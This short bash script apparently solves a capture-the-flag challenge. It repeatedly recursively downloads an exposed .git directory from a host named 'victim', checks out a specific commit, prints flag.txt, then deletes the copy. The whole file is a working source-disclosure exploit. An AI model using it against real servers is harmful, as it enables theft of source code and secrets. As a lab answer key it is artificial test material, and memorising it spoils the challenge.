#!/bin/bash

./requirements.sh

until wget -q --recursive --no-parent http://victim:8080/.git/; do
    sleep 1
done
cd "victim:8080"
git checkout -q 4ba5380

echo "$(cat flag.txt)"

cd ..
rm -r "victim:8080"
